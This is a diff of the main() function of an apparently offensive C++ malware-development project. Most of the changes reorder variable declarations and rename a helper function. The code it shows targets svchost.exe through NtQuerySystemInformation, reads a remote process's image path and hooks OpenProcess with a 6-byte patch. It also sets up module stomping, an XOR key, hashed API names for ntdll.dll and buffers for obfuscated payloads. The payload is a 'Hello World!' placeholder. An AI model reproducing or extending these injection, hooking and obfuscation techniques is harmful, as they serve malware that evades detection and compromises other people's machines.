@@ -2,16 +2,6 @@
 
 int main()
 {
-	
-	HANDLE						  hProcess					= INVALID_HANDLE_VALUE,
-								  hProcess1					= INVALID_HANDLE_VALUE,
-								  hProcess2					= INVALID_HANDLE_VALUE,
-								  hThread					= INVALID_HANDLE_VALUE,
-								  hThread1					= INVALID_HANDLE_VALUE,
-								  hThread2					= INVALID_HANDLE_VALUE,
-								  hPayloadObjectHandle		= INVALID_HANDLE_VALUE,
-								  hHeap						= INVALID_HANDLE_VALUE;
-
 	DWORD						  dwPID0					= NULL,
 								  dwPID1					= NULL,
 							      dwPID2					= NULL,
@@ -19,14 +9,15 @@ int main()
 								  dwThreadId				= NULL,
 								  dwThreadId1				= NULL,
 								  dwThreadId2				= NULL,
-								  dwHashedString1			= 0xfbb639b7,
-								  dwHashedString2			= 0xb6e8ee02;
+								  dwHashedString1			= 0xFBB639B7,
+								  dwHashedString2			= 0xB6E8EE02;
 
-	SIZE_T						  sBytesWritten				= 0x00000006,
-								  sPaddedInputSize			= 0x00000040,
+	SIZE_T						  sHookLength				= NULL,
 								  sObfuscatedSize			= NULL,
 								  sClearPayload				= NULL,
-								  sOriginalInputSize		= 0x00000040;
+								  sBytesWritten				= 0x06,
+								  sPaddedInputSize			= 0x40,
+								  sOriginalInputSize		= 0x40;
 	
 	PBYTE						  pExPayload				= nullptr,
 								  pStompingTarget			= nullptr,
@@ -51,6 +42,16 @@ int main()
 
 	HMODULE						  hModuleCustom				= nullptr;
 
+	HANDLE						  hProcess					= INVALID_HANDLE_VALUE,
+								  hProcess1					= INVALID_HANDLE_VALUE,
+								  hProcess2					= INVALID_HANDLE_VALUE,
+								  hThread					= INVALID_HANDLE_VALUE,
+								  hThread1					= INVALID_HANDLE_VALUE,
+								  hThread2					= INVALID_HANDLE_VALUE,
+								  hPayloadObjectHandle		= INVALID_HANDLE_VALUE,
+								  hHeap						= INVALID_HANDLE_VALUE;
+
+
 	LPWSTR						  pImagePath				= nullptr,
 								  pImagePath2				= nullptr;
 
@@ -58,7 +59,7 @@ int main()
 								  pTargetStringToHash_2[]	= "ntdll.dll",
 								  pOutput[9]				= { };
 
-	static BYTE					  pTargetSubDirectory[9]	= { 0xC0, 0xA8, 0x01, 0x01, 0x0A, 0x00, 0x00, 0x01, 0x00 },
+	BYTE						  pTargetSubDirectory[9]	= { 0xC0, 0xA8, 0x01, 0x01, 0x0A, 0x00, 0x00, 0x01, 0x00 },
 								  pXorKey[8]				= { 0xB3, 0xD1, 0x72, 0x75, 0x6F, 0x6D, 0x33, 0x33 };
 
 	WCHAR						  TargetProcessName[]		= L"svchost.exe",
@@ -72,13 +73,11 @@ int main()
 
 	FetchProcessHandleNtQuerySystemInformation(TargetProcessName, &dwPID0, &hProcess);
 
-	FetchPathFromRunningProcess(hProcess, reinterpret_cast<LPWSTR*>(&pwPath));
+	FetchPathFromRemoteProcess(hProcess, reinterpret_cast<LPWSTR*>(&pwPath));
 
 	OpenProcess(PROCESS_ALL_ACCESS, FALSE, 25116);
 
 	HookWithVirtualAlloc(reinterpret_cast<PVOID>(OpenProcess), reinterpret_cast<PVOID>(GlobalOpenProcess), 6);
-
-
 
 	hThread = GetCurrentThread();
 
@@ -95,7 +94,6 @@ int main()
 	pExtPayloadAddress = static_cast<PBYTE>(malloc(20));
 
 	memcpy(pExtPayloadAddress, "Hello World!\0", 13);
-
 
 	//MapLocalMemory(pExtPayloadAddress, &pExPayload, 15, &hHeap);
 
@@ -123,7 +121,7 @@ int main()
 
 	if (FetchProcessHandleNtQuerySystemInformation(TargetProcessName, &dwHashedString2, &hProcess) == FALSE) printf(":(\n");
 
-	FetchPathFromRunningProcess(hProcess, &pImagePath);
+	FetchPathFromRemoteProcess(hProcess, &pImagePath);
 
 	printf("Starting PE Parser...\n");
 
@@ -281,7 +279,7 @@ for (DWORD i = 0; i < pImageExportDirectory->NumberOfNames; i++)
 
 /*if (!FetchProcessHandleNtQuerySystemInformation(TargetProcessName, &dwPID0, &hProcess))
 {
-wprintf(L"[!] Enumerate Processes Nt Query System Information Failed to Find %s\n", TargetProcessName);
+	wprintf(L"[!] Enumerate Processes Nt Query System Information Failed to Find %s\n", TargetProcessName);
 	return -1;
 }
 */
